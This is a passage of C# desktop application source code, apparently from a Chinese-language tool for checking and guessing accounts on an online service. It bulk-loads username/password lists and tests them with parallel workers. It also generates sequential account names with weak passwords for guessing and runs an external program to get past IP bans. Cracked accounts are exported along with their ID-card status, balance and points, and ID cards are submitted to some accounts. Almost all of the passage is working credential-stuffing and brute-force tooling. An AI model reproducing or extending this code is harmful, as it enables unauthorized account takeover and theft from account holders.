                        SQLiteCommandBuilder cmdbuilder = new SQLiteCommandBuilder(dataadapter);
                        dataadapter.InsertCommand = cmdbuilder.GetInsertCommand();
                        using (SQLiteTransaction ts = m_pwcconn.BeginTransaction())
                        {
                            dataadapter.Update(m_pwcdataset);
                            ts.Commit();
                        }
                        m_logger.Debug("数据库更新:" + (System.Environment.TickCount - begintick) + "ms");
                    }
                    m_walkiterator = 0;
                }
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            finally
            {

            }
        }

        void load_cseuidtxt(string uidtxt)
        {
            try
            {
                if (File.Exists(uidtxt))
                {
                    using (SQLiteCommand cmd = new SQLiteCommand(m_cseconn))
                    {
                        m_csedataset.Tables[0].Clear();

                        cmd.CommandText = "DELETE FROM " + cse_uidtable;
                        cmd.ExecuteNonQuery();

                        string[] lines = File.ReadAllLines(uidtxt, Encoding.GetEncoding("GB2312"));
                        string pattern = @"[0-9]*[^a-zA-z0-9]*(\w+)[^a-zA-z0-9]*(\w+)";

                        foreach (string line in lines)
                        {
                            Match mt = Regex.Match(line, pattern);
                            if (mt.Groups.Count == 3)
                            {
                                string uid = mt.Groups[1].ToString();
                                string pw = mt.Groups[2].ToString();

                                DataRow newRow = m_csedataset.Tables[0].Rows.Add();
                                newRow[cse_column_uid] = uid;
                                newRow[cse_column_password] = pw;

                            }
                        }

                        int begintick = System.Environment.TickCount;
                        cmd.CommandText = "SELECT * FROM " + cse_uidtable;
                        SQLiteDataAdapter dataadapter = new SQLiteDataAdapter(cmd);
                        SQLiteCommandBuilder cmdbuilder = new SQLiteCommandBuilder(dataadapter);
                        dataadapter.InsertCommand = cmdbuilder.GetInsertCommand();
                        using (SQLiteTransaction ts = m_cseconn.BeginTransaction())
                        {
                            dataadapter.Update(m_csedataset);
                            ts.Commit();
                        }
                        m_logger.Debug("cse数据库更新:" + (System.Environment.TickCount - begintick) + "ms");
                    }
                    m_csewalkiterator = 0;
                }
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            finally
            {

            }
        }

        void load_carduidtxt(string uidtxt)
        {
            if (File.Exists(uidtxt))
            {
                using (SQLiteCommand cmd = new SQLiteCommand(m_cardconn))
                {
                    m_carddataset.Tables[0].Clear();

                    cmd.CommandText = "DELETE FROM " + card_uidtable;
                    cmd.ExecuteNonQuery();

                    string[] lines = File.ReadAllLines(uidtxt, Encoding.GetEncoding("GB2312"));
                    string pattern = @"[0-9]*[^a-zA-z0-9]*(\w+)[^a-zA-z0-9]*(\w+)";

                    foreach (string line in lines)
                    {
                        Match mt = Regex.Match(line, pattern);
                        if (mt.Groups.Count == 3)
                        {
                            string uid = mt.Groups[1].ToString();
                            string pw = mt.Groups[2].ToString();

                            DataRow newRow = m_carddataset.Tables[0].Rows.Add();
                            newRow[card_column_uid] = uid;
                            newRow[card_column_password] = pw;

                        }
                    }

                    int begintick = System.Environment.TickCount;
                    cmd.CommandText = "SELECT * FROM " + card_uidtable;
                    SQLiteDataAdapter dataadapter = new SQLiteDataAdapter(cmd);
                    SQLiteCommandBuilder cmdbuilder = new SQLiteCommandBuilder(dataadapter);
                    dataadapter.InsertCommand = cmdbuilder.GetInsertCommand();
                    using (SQLiteTransaction ts = m_cardconn.BeginTransaction())
                    {
                        dataadapter.Update(m_carddataset);
                        ts.Commit();
                    }
                    m_logger.Debug("card数据库更新:" + (System.Environment.TickCount - begintick) + "ms");
                }
                m_cardwalkiterator = 0;
            }
        }

        protected override void OnClosing(System.ComponentModel.CancelEventArgs e)
        {
            try
            {
                m_boshutdwon = true;

                m_uidbacker.BackUp();
                Thread.Sleep(3000);
                m_pwcconn.Close();
                CLogger.StopAllLoggers();
                m_saveThread.Join(3000);
            }
            catch (System.Exception)
            {

            }
            base.OnClosing(e);
        }

        private void button2_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                btnStop.IsEnabled = false;
                CheckCpWorkerStatus();
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void statusGrid_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effects = DragDropEffects.Link;                            //WinForm中为e.Effect = DragDropEffects.Link
            else 
                e.Effects = DragDropEffects.None;             
        }

        private void statusGrid_Drop(object sender, DragEventArgs e)
        {
            string fileName = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();
            load_uidtxt(fileName);
        }

        public void dataGrid_LoadingRow(object sender, DataGridRowEventArgs e)
        {
            e.Row.Header = e.Row.GetIndex() + 1;
        }

        private void btnExportCpResult_Click(object sender, RoutedEventArgs e)
        {
            Microsoft.Win32.SaveFileDialog dlg = new Microsoft.Win32.SaveFileDialog();
            dlg.Filter = "保存类型 |*.txt";
            dlg.FilterIndex = 1;
            if (dlg.ShowDialog() == true)
            {
                using (FileStream fs = new FileStream(dlg.FileName,FileMode.Create))
                {
                    using (StreamWriter writer = new StreamWriter(fs))
                    {
                        for (int i = 0; i < m_pwcdataset.Tables[0].Rows.Count; ++i)
                        {
                            string uid = m_pwcdataset.Tables[0].Rows[i][column_uid].ToString();
                            string pwd = m_pwcdataset.Tables[0].Rows[i][column_password].ToString();
                            string status = m_pwcdataset.Tables[0].Rows[i][column_status].ToString();

                            writer.WriteLine(uid + "----" + pwd + "----" + status);
                        }
                    }
                }
            }
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            UidGrid.DragEnter += new DragEventHandler(statusGrid_DragEnter);
            UidGrid.Drop += new DragEventHandler(statusGrid_Drop);

            CheckUidSafeGrid.DragEnter += new DragEventHandler(CheckUidSafeGrid_DragEnter);
            CheckUidSafeGrid.Drop += new DragEventHandler(CheckUidSafeGrid_Drop);

            CardUidGrid.DragEnter += new DragEventHandler(CardUidGrid_DragEnter);
            CardUidGrid.Drop += new DragEventHandler(CardUidGrid_Drop);

            int workerThreads = 0;
            int completePortsThreads = 0;
            ThreadPool.GetMaxThreads(out workerThreads, out completePortsThreads);
            ThreadPool.SetMaxThreads(workerThreads*10, completePortsThreads*10);

            if (m_userlvl < 0)
            {
                tabItem1.Visibility = Visibility.Collapsed;
                tabItem2.Visibility = Visibility.Collapsed;
                tabItem3.Visibility = Visibility.Collapsed;
                tabItem5.IsSelected = true;
            }

            if (m_userlvl == 0)
            {
                tabItem3.Visibility = Visibility.Collapsed;
            }
            if (m_userlvl >= 100)
            {
                tbxGuessWorkerNum.MaxLength = 2;
            }
        }

        void CardUidGrid_Drop(object sender, DragEventArgs e)
        {
            string fileName = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();
            load_carduidtxt(fileName);
        }

        void CardUidGrid_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effects = DragDropEffects.Link;
            else
                e.Effects = DragDropEffects.None;     
        }

        void CheckUidSafeGrid_Drop(object sender, DragEventArgs e)
        {
            string fileName = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();
            load_cseuidtxt(fileName);
        }

        void CheckUidSafeGrid_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effects = DragDropEffects.Link;
            else
                e.Effects = DragDropEffects.None;     
        }

        void firstStart()
        {
            CpWorker.DBpwd = MyDes.Decode(m_safedbpwd, m_safekey);
            SeWorker.DBpwd = CpWorker.DBpwd;
            GuessWorker.DBpwd = CpWorker.DBpwd;
            CardWorker.DBpwd = CpWorker.DBpwd;

            if (!String.IsNullOrEmpty(m_safelg)
                && !String.IsNullOrEmpty(m_safepw))
            {
                load_captcha_from_safetxt(m_safelg, m_constkey, m_lgcaptcha);
                load_captcha_from_safetxt(m_safepw, m_constkey, m_pwcaptcha);

                save_captcha_db_from_dic(m_lgcaptcha, CpWorker.DBpwd, "lg");
                save_captcha_db_from_dic(m_pwcaptcha, CpWorker.DBpwd, "pwc");
            }
            else
            {
                load_captcha_from_db(m_lgcaptcha, CpWorker.DBpwd, "lg");
                load_captcha_from_db(m_pwcaptcha, CpWorker.DBpwd, "pwc");
            }

            CpWorker.StartRunTime = System.Environment.TickCount;
            SeWorker.StartRunTime = CpWorker.StartRunTime;
            GuessWorker.StartRunTime = CpWorker.StartRunTime;
        }

        private void btnStartCheckSafe_Click(object sender, RoutedEventArgs e)
        {
            if (!File.Exists(md5js))
            {
                MessageBox.Show(lgxml + "文件不存在", "", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (m_bofirststart)
            {
                firstStart();
                m_bofirststart = false;
            }

            if (SeWorker.KeepRunTime != 0)
            {
                if (System.Environment.TickCount - SeWorker.StartRunTime > SeWorker.KeepRunTime)
                {
                    if (File.Exists(captchadb))
                    {
                        File.Delete(captchadb);
                    }
                    m_lgcaptcha.Clear();
                    m_pwcaptcha.Clear();

                    for (int i = 0; i < m_cpworkers.Count; ++i)
                    {
                        m_seworkers[i].m_lgcaptcha.Clear();
                        m_seworkers[i].m_pwcaptcha.Clear();
                    }
                    MessageBox.Show("试用到期了!!");
                    return;
                }
            }

            int num = int.Parse(tbxSeWorkerNumber.Text);
            for (int i = 0; i < num; ++i)
            {
                if (m_seworkers.Count <= i)
                {
                    SeWorker worker = new SeWorker(m_lgcaptcha, m_pwcaptcha, m_safekey);
                    if (m_userlvl >= 2)
                    {
                        worker.QuerySafePoint = true;
                    }
                    worker.FinishTask += new Action<SeWorker, string, string, string, int, int, int>(seworker_FinishTask);
                    m_seworkers.Add(worker);
                }

                DataRow nextuidrow = IteratorNextRow(m_csedataset.Tables[0], cse_column_status, ref m_csewalkiterator);
                if (nextuidrow != null)
                {
                    string uid = (string)nextuidrow[cse_column_uid];
                    string pwd = (string)nextuidrow[cse_column_password];
                    m_seworkers[i].BeginTask(uid.ToLower().Trim(), pwd.Trim(), nextuidrow, m_IpToken);
                    nextuidrow[cse_column_status] = status_ready;

                    //m_logger.Debug("begin uid:" + uid + " pwd:" + pwd + " newpwd:" + newpwd);
                }
                else
                {
                    m_seworkers[i].IsWorking = false;
                }
            }

            btnStartCheckSafe.IsEnabled = false;
            tbxSeWorkerNumber.IsEnabled = false;

            CheckSeWorkerStatus();
        }

        void seworker_FinishTask(SeWorker seworker, string uid, string pwd, string status, int has_idcard, int yue, int safepoint)
        {
            BackgroundWorker worker = new BackgroundWorker();
            worker.DoWork += new DoWorkEventHandler(seworker_OnTaskFinish);
            worker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(seworker_RunWorkerCompleted);
            worker.RunWorkerAsync(new Tuple<SeWorker, string, string, string, int, int, int>(seworker, uid, pwd, status, has_idcard, yue, safepoint));
        }

        void seworker_OnTaskFinish(object sender, DoWorkEventArgs e)
        {
            try
            {
                //var arg = e.Argument as Tuple<SeWorker, string, string, string, int, int, int, int>;
                //SeWorker seworker = arg.Item1;
                //string uid = arg.Item2;
                //string pwd = arg.Item3;
                //string status = arg.Item4;
                //int has_idcard = arg.Item5;
                //int yue = arg.Item6;
                //int safepoint = arg.Item7;

                lock (m_saveSeObjList)
                {
                    m_saveSeObjList.Add(e.Argument);
                }

                e.Result = e.Argument;
            }
            catch (System.Exception ex)
            {
                m_logger.Error(ex.ToString());
            }
        }

        void seworker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            var arg = e.Result as Tuple<SeWorker, string, string, string, int, int, int>;
            SeWorker seworker = arg.Item1;
            string uid = arg.Item2;
            string pwd = arg.Item3;
            string status = arg.Item4;
            int has_idcard = arg.Item5;
            int yue = arg.Item6;
            int safepoint = arg.Item7;

            Dispatcher.BeginInvoke(new Action(() =>
            {
                if (status == "IP被封")
                {
                    if (seworker.IpToken == m_IpToken)
                    {
                        m_logger.Debug("启动RebootRoutine.exe...");
                        if (File.Exists("RebootRoutine.exe"))
                        {
                            Process pro = Process.Start("RebootRoutine.exe");
                            pro.WaitForExit();
                        }
                        m_logger.Debug("RebootRoutine 退出!!");
                        m_IpToken++;
                    }
                }
                DataRow targetrow = seworker.workArgument as DataRow;
                targetrow[cse_column_status] = status;
                if (status == "查询成功")
                {
                    targetrow[cse_column_se_idcard] = queryResult[has_idcard];
                    targetrow[cse_column_se_safepoint] = safepoint;
                    targetrow[cse_column_se_balance] = yue;

                    m_uidbacker.PushUid(uid, pwd, pwd, "se");
                }


                try
                {
                    if (SeWorker.KeepRunTime != 0 && btnStartCheckSafe.IsEnabled)
                    {
                        if (System.Environment.TickCount - SeWorker.StartRunTime > SeWorker.KeepRunTime)
                        {
                            btnStop.IsEnabled = false;
                            MessageBox.Show("试用时间到了!!");
                        }
                    }

                    if (btnStopCheckSafe.IsEnabled == true)
                    {
                        DataRow nextuidrow = IteratorNextRow(m_csedataset.Tables[0], cse_column_status, ref m_csewalkiterator);
                        if (nextuidrow != null)
                        {
                            string nextuid = (string)nextuidrow[cse_column_uid];
                            string nextpwd = (string)nextuidrow[cse_column_password];
                            seworker.BeginTask(nextuid.ToLower().Trim(), nextpwd.Trim(), nextuidrow, m_IpToken);
                            nextuidrow[cse_column_status] = status_ready;
                        }
                        else
                        {
                            seworker.IsWorking = false;
                            CheckSeWorkerStatus();
                        }
                    }
                    else
                    {
                        seworker.IsWorking = false;
                        CheckSeWorkerStatus();
                    }

                }
                catch (System.Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }));
        }

        void CheckSeWorkerStatus()
        {
            foreach (SeWorker w in m_seworkers)
            {
                if (w.IsWorking == true)
                {
                    return;
                }
            }
            btnStartCheckSafe.IsEnabled = true;
            btnStopCheckSafe.IsEnabled = true;
            tbxSeWorkerNumber.IsEnabled = true;
        }

        private void btnStopCheckSafe_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                btnStopCheckSafe.IsEnabled = false;
                CheckSeWorkerStatus();
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void btnExportCheckSafe_Click(object sender, RoutedEventArgs e)
        {
            Microsoft.Win32.SaveFileDialog dlg = new Microsoft.Win32.SaveFileDialog();
            dlg.Filter = "保存类型 |*.txt";
            dlg.FilterIndex = 1;
            if (dlg.ShowDialog() == true)
            {
                using (FileStream fs = new FileStream(dlg.FileName, FileMode.Create))
                {
                    using (StreamWriter writer = new StreamWriter(fs))
                    {
                        for (int i = 0; i < m_csedataset.Tables[0].Rows.Count; ++i)
                        {
                            string uid = m_csedataset.Tables[0].Rows[i][cse_column_uid].ToString();
                            string pwd = m_csedataset.Tables[0].Rows[i][cse_column_password].ToString();
                            string status = m_csedataset.Tables[0].Rows[i][cse_column_status].ToString();
                            string idcard = m_csedataset.Tables[0].Rows[i][cse_column_se_idcard].ToString();
                            string safepoint = m_csedataset.Tables[0].Rows[i][cse_column_se_safepoint].ToString();
                            string yue = m_csedataset.Tables[0].Rows[i][cse_column_se_balance].ToString();

                            writer.WriteLine(uid + "----" + pwd + "----" + status + "----" + idcard + "----" + safepoint + "----" + yue);
                        }
                    }
                }
            }
        }

        string GuessNextAccount(int saohaoset)
        {
            return m_GuessAccountPrefix + string.Format("{0:D" + m_numberOfDigit + "}", m_GuessBeginValue++);
        }

        private void btnStartSaohao_Click(object sender, RoutedEventArgs e)
        {
            if (m_bofirststart)
            {
                firstStart();
                m_bofirststart = false;
            }

            if (GuessWorker.KeepRunTime != 0)
            {
                if (System.Environment.TickCount - GuessWorker.StartRunTime > GuessWorker.KeepRunTime)
                {
                    if (File.Exists(captchadb))
                    {
                        File.Delete(captchadb);
                    }
                    m_lgcaptcha.Clear();
                    m_pwcaptcha.Clear();

                    for (int i = 0; i < m_cpworkers.Count; ++i)
                    {
                        m_guessWorkers[i].m_lgcaptcha.Clear();
                        m_guessWorkers[i].m_pwcaptcha.Clear();
                    }
                    MessageBox.Show("试用到期了!!");
                    return;
                }
            }

            if (String.IsNullOrEmpty(tbxPrefixAccount.Text) 
                || String.IsNullOrEmpty(tbxBeginValue.Text))
            {
                MessageBox.Show("请先填写账号前缀,起始值!", "提示", MessageBoxButton.OK
                    , MessageBoxImage.Information);
                return;
            }
            Regex re = new Regex("[a-z0-9]+");
            if (!re.IsMatch(tbxPrefixAccount.Text) || !re.IsMatch(tbxBeginValue.Text))
            {
                MessageBox.Show("账号前缀或者起始值格式错误!", "提示", MessageBoxButton.OK
                    , MessageBoxImage.Information);
                return;
            }
            
            m_GuessSet = 10;
            m_GuessBeginValue = Convert.ToInt32(tbxBeginValue.Text);
            m_GuessAccountPrefix = tbxPrefixAccount.Text;
            m_numberOfDigit = tbxBeginValue.Text.Length;

            try
            {
                int numOfWorkers = Convert.ToInt32(tbxGuessWorkerNum.Text);
                for (int i = 0; i < numOfWorkers; ++i)
                {
                    if (numOfWorkers >= m_guessWorkers.Count)
                    {
                        GuessWorker worker = new GuessWorker(m_lgcaptcha, m_pwcaptcha, m_safekey);
                        worker.FinishTask += new Action<GuessWorker, string, string, string, int, int, int>(guessworker_FinishTask);
                        m_guessWorkers.Add(worker);
                    }

                    string nextguess = GuessNextAccount(m_GuessSet);
                    //m_guessWorkers[i].BeginTask(nextguess.Trim(), nextguess.Trim(), null, m_IpToken);
                    if (rdbNumberSame.IsChecked == true)
                    {
                        string nextpwd = nextguess.Substring(nextguess.IndexOfAny(new char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' }));
                        m_guessWorkers[i].BeginTask(nextguess.ToLower().Trim(), nextpwd, null, m_IpToken);
                    }
                    else if (rdbFixpwd.IsChecked == true)
                    {
                        m_guessWorkers[i].BeginTask(nextguess.ToLower().Trim(), tbxFixpwd.Text, null, m_IpToken);
                    }
                    else
                    {
                        m_guessWorkers[i].BeginTask(nextguess.ToLower().Trim(), nextguess.Trim(), null, m_IpToken);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }

            btnStartSaohao.IsEnabled = false;
            tbxPrefixAccount.IsEnabled = false;
            tbxBeginValue.IsEnabled = false;
            tbxGuessWorkerNum.IsEnabled = false;

            CheckGuessWorkerStatus();
        }

        void guessworker_FinishTask(GuessWorker seworker, string uid, string pwd, string status, int has_idcard, int yue, int userpoint)
        {
            BackgroundWorker worker = new BackgroundWorker();
            worker.DoWork += new DoWorkEventHandler(guessworker_OnTaskFinish);
            worker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(guessworker_RunWorkerCompleted);
            worker.RunWorkerAsync(new Tuple<GuessWorker, string, string, string, int, int, int>(seworker, uid, pwd, status, has_idcard, yue, userpoint));
        }

        void guessworker_OnTaskFinish(object sender, DoWorkEventArgs e)
        {
            try
            {
                e.Result = e.Argument;
            }
            catch (System.Exception ex)
            {
                m_logger.Error(ex.ToString());
            }
        }

        void guessworker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            var arg = e.Result as Tuple<GuessWorker, string, string, string, int, int, int>;
            GuessWorker guessworker = arg.Item1;
            string uid = arg.Item2;
            string pwd = arg.Item3;
            string status = arg.Item4;
            int has_idcard = arg.Item5;
            int yue = arg.Item6;
            int userpoint = arg.Item7;

            Dispatcher.BeginInvoke(new Action(() =>
            {
                if (status == "IP被封")
                {
                    if (guessworker.IpToken == m_IpToken)
                    {
                        if (File.Exists("RebootRoutine.exe"))
                        {
                            m_logger.Debug("启动RebootRoutine.exe...");
                            Process pro = Process.Start("RebootRoutine.exe");
                            pro.WaitForExit();
                            m_logger.Debug("RebootRoutine 退出!!");
                        }
                        else
                        {
                            MessageBox.Show("IP被封,RebootRoutine.exe文件不存在!");
                        }
                        m_IpToken++;
                    }
                }
                if (status == "查询成功")
                {
                    m_countOfGuessOk++;
                    DataRow row = m_guessdataset.Tables[0].NewRow();
                    row[guess_column_uid] = uid;
                    row[guess_column_password] = pwd;
                    row[guess_column_status] = status;
                    row[guess_column_se_idcard] = queryResult[has_idcard];
                    row[guess_column_se_jifen] = userpoint;
                    row[guess_column_se_balance] = yue;
                    m_guessdataset.Tables[0].Rows.Add(row);
                    lock (m_saveGuessObjList)
                    {
                        m_saveGuessObjList.Add(arg);
                    }

                    m_uidbacker.PushUid(uid, pwd, "", "guess");
                }

                m_countOfGuess++;
                tbStatus.Text = string.Format("{0} {1} | 累积成功:{2}/{3} | ", uid, status, m_countOfGuessOk, m_countOfGuess);
                tbxBeginValue.Text = string.Format("{0:D" + m_numberOfDigit + "}", m_GuessBeginValue);

                try
                {
                    if (GuessWorker.KeepRunTime != 0 && btnStartCheckSafe.IsEnabled)
                    {
                        if (System.Environment.TickCount - GuessWorker.StartRunTime > GuessWorker.KeepRunTime)
                        {
                            btnStopSaohao.IsEnabled = false;
                            MessageBox.Show("试用时间到了!!");
                        }
                    }

                    if (btnStopSaohao.IsEnabled == true)
                    {
                        string next = GuessNextAccount(m_GuessSet);
                        if (!string.IsNullOrEmpty(next))
                        {
                            if (rdbNumberSame.IsChecked == true)
                            {
                                string nextpwd = next.Substring(next.IndexOfAny(new char[]{'0','1','2','3','4','5','6','7','8','9'}));
                                guessworker.BeginTask(next.ToLower().Trim(), nextpwd.Trim(), null, m_IpToken);
                            }
                            else if (rdbFixpwd.IsChecked == true)
                            {
                                guessworker.BeginTask(next.ToLower().Trim(), tbxFixpwd.Text.Trim(), null, m_IpToken);
                            }
                            else
                            {
                                guessworker.BeginTask(next.ToLower().Trim(), next.Trim(), null, m_IpToken);
                            }
                        }
                        else
                        {
                            guessworker.IsWorking = false;
                            CheckGuessWorkerStatus();
                        }
                    }
                    else
                    {
                        guessworker.IsWorking = false;
                        CheckGuessWorkerStatus();
                    }

                }
                catch (System.Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }));
        }

        void cardworker_FinishTask(CardWorker worker, string uid, string pwd, string status, string cardid, string cardname)
        {
            BackgroundWorker backworker = new BackgroundWorker();
            backworker.DoWork += new DoWorkEventHandler(cardworker_OnTaskFinish);
            backworker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(cardworker_RunWorkerCompleted);
            backworker.RunWorkerAsync(new Tuple<CardWorker, string, string, string, string, string>(worker, uid, pwd, status, cardid, cardname));
        }

        void cardworker_OnTaskFinish(object sender, DoWorkEventArgs e)
        {
             e.Result = e.Argument;
             lock (m_saveCardObjList)
             {
                 m_saveCardObjList.Add(e.Result);
             }
        }

        void cardworker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            var arg = e.Result as Tuple<CardWorker, string, string, string, string, string>;
            CardWorker cardworker = arg.Item1;
            string uid = arg.Item2;
            string pwd = arg.Item3;
            string status = arg.Item4;
            string cardid = arg.Item5;
            string cardname = arg.Item6;

            Dispatcher.BeginInvoke(new Action(() =>
            {
                if (status == "IP被封")
                {
                    if (cardworker.IpToken == m_IpToken)
                    {
                        if (File.Exists("RebootRoutine.exe"))
                        {
                            m_logger.Debug("启动RebootRoutine.exe...");
                            Process pro = Process.Start("RebootRoutine.exe");
                            pro.WaitForExit();
                            m_logger.Debug("RebootRoutine 退出!!");
                        }
                        else
                        {
                            MessageBox.Show("IP被封,RebootRoutine.exe文件不存在!");
                        }
                        m_IpToken++;
                    }
                }

                DataRow targetrow = cardworker.workArgument as DataRow;
                targetrow[cse_column_status] = status;
                targetrow[card_column_cardid] = cardid;
                targetrow[card_column_cardname] = cardname;

                if (status == "上证成功")
                {
                    m_uidbacker.PushUid(uid, pwd, "", "card");   
                }

                try
                {
                    if (CardWorker.KeepRunTime != 0 && btnStartCardSubmit.IsEnabled)
                    {
                        if (System.Environment.TickCount - GuessWorker.StartRunTime > CardWorker.KeepRunTime)
                        {
                            btnStopCardSubmit.IsEnabled = false;
                            MessageBox.Show("试用时间到了!!");
                        }
                    }

                    if (btnStopCardSubmit.IsEnabled == true)
                    {
                        DataRow nextuidrow = IteratorNextRow(m_carddataset.Tables[0], card_column_status, ref m_cardwalkiterator);
                        if (nextuidrow != null)
                        {
                            string nextuid = (string)nextuidrow[cse_column_uid];
                            string nextpwd = (string)nextuidrow[cse_column_password];
                            cardworker.BeginTask(nextuid.ToLower().Trim(), nextpwd.Trim(), nextuidrow, m_IpToken);
                            nextuidrow[cse_column_status] = status_ready;
                        }
                        else
                        {
                            cardworker.IsWorking = false;
                            CheckCardWorkerStatus();
                        }

                        //string next = GuessNextAccount(m_GuessSet);
                        //if (!string.IsNullOrEmpty(next))
                        //{
                        //    cardworker.BeginTask(next.ToLower().Trim(), next.Trim(), null, m_IpToken);
                        //}
                        //else
                        //{
                        //    cardworker.IsWorking = false;
                        //    CheckCardWorkerStatus();
                        //}
                    }
                    else
                    {
                        cardworker.IsWorking = false;
                        CheckCardWorkerStatus();
                    }

                }
                catch (System.Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }));
        }

        void CheckCardWorkerStatus()
        {
            foreach (CardWorker w in m_cardwokers)
            {
                if (w.IsWorking == true)
                {
                    return;
                }
            }
            btnStartCardSubmit.IsEnabled = true;
            btnStopCardSubmit.IsEnabled = true;
            tbxCardWorkerNum.IsEnabled = true;
        }

        void CheckGuessWorkerStatus()
        {
            foreach (GuessWorker w in m_guessWorkers)
            {
                if (w.IsWorking == true)
                {
                    return;
                }
            }
            btnStartSaohao.IsEnabled = true;
            btnStopSaohao.IsEnabled = true;
            tbxPrefixAccount.IsEnabled = true;
            tbxBeginValue.IsEnabled = true;
            tbxGuessWorkerNum.IsEnabled = true;
        }

        private void btnStopSaohao_Click(object sender, RoutedEventArgs e)
        {
            btnStopSaohao.IsEnabled = false;
            CheckGuessWorkerStatus();
        }

        private void btnExportSaohao_Click(object sender, RoutedEventArgs e)
        {
            Microsoft.Win32.SaveFileDialog dlg = new Microsoft.Win32.SaveFileDialog();
            dlg.Filter = "保存类型 |*.txt";
            dlg.FilterIndex = 1;
            if (dlg.ShowDialog() == true)
            {
                using (FileStream fs = new FileStream(dlg.FileName, FileMode.Create))
                {
                    using (StreamWriter writer = new StreamWriter(fs))
                    {
                        for (int i = 0; i < m_guessdataset.Tables[0].Rows.Count; ++i)
                        {
                            string uid = m_guessdataset.Tables[0].Rows[i][guess_column_uid].ToString();
                            string pwd = m_guessdataset.Tables[0].Rows[i][guess_column_password].ToString();
                            string status = m_guessdataset.Tables[0].Rows[i][guess_column_status].ToString();
                            string idcard = m_guessdataset.Tables[0].Rows[i][guess_column_se_idcard].ToString();
                            string jifen = m_guessdataset.Tables[0].Rows[i][guess_column_se_jifen].ToString();
                            string yue = m_guessdataset.Tables[0].Rows[i][guess_column_se_balance].ToString();

                            writer.WriteLine(uid + "----" + pwd + "----" + status + "----" + idcard + "----" + jifen + "----" + yue);
                        }
                    }
                }
            }
        }

        private void PreviewTextInput_NumberAndEnglish(object sender, TextCompositionEventArgs e)
        {
            Regex re = new Regex("[^\u4e00-\u9fa5a-z0-9.-]+");
            e.Handled = re.IsMatch(e.Text);
        }

        private void PreviewTextInput_Number(object sender, TextCompositionEventArgs e)
        {
            Regex re = new Regex("[^\u4e00-\u9fa50-9.-]+");
            e.Handled = re.IsMatch(e.Text);
        }

        private void btnCleanRecord_Click(object sender, RoutedEventArgs e)
        {
            m_guessdataset.Tables[0].Rows.Clear();
            using (SQLiteCommand cmd = new SQLiteCommand(m_guessconn))
            {
                cmd.CommandText = "DELETE FROM " + guess_uidtable;

                int effectOfCount = cmd.ExecuteNonQuery();
                m_logger.Debug("clean {0} guess items!", effectOfCount);
            }
        }

        private void btnStartCardSubmit_Click(object sender, RoutedEventArgs e)
        {
            if (!File.Exists(md5js))
            {
                MessageBox.Show(lgxml + "文件不存在", "", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (m_bofirststart)
            {
                firstStart();
                m_bofirststart = false;
            }

            if (CardWorker.KeepRunTime != 0)
            {
                if (System.Environment.TickCount - CardWorker.StartRunTime > CardWorker.KeepRunTime)
                {
                    if (File.Exists(captchadb))
                    {
                        File.Delete(captchadb);
                    }
                    m_lgcaptcha.Clear();
                    m_pwcaptcha.Clear();

                    for (int i = 0; i < m_cpworkers.Count; ++i)
                    {
                        m_cardwokers[i].m_lgcaptcha.Clear();
                        m_cardwokers[i].m_pwcaptcha.Clear();
                    }
                    MessageBox.Show("试用到期了!!");
                    return;
                }
            }

            int num = int.Parse(tbxCardWorkerNum.Text);
            for (int i = 0; i < num; ++i)
            {
                if (m_cardwokers.Count <= i)
                {
                    CardWorker worker = new CardWorker(m_lgcaptcha, m_pwcaptcha, m_safekey);
                    worker.FinishTask += cardworker_FinishTask;
                    m_cardwokers.Add(worker);
                }

                DataRow nextuidrow = IteratorNextRow(m_carddataset.Tables[0], card_column_status, ref m_cardwalkiterator);
                if (nextuidrow != null)
                {
                    string uid = (string)nextuidrow[cse_column_uid];
                    string pwd = (string)nextuidrow[cse_column_password];
                    m_cardwokers[i].BeginTask(uid.ToLower().Trim(), pwd.Trim(), nextuidrow, m_IpToken);
                    nextuidrow[cse_column_status] = status_ready;

                    //m_logger.Debug("begin uid:" + uid + " pwd:" + pwd + " newpwd:" + newpwd);
                }
                else
                {
                    m_cardwokers[i].IsWorking = false;
                }
            }
            btnStartCardSubmit.IsEnabled = false;
            tbxCardWorkerNum.IsEnabled = false;

            CheckCardWorkerStatus();
        }

        private void btnStopCardSubmit_Click(object sender, RoutedEventArgs e)
        {
            btnStopCardSubmit.IsEnabled = false;
            CheckCardWorkerStatus();
        }
    }
}
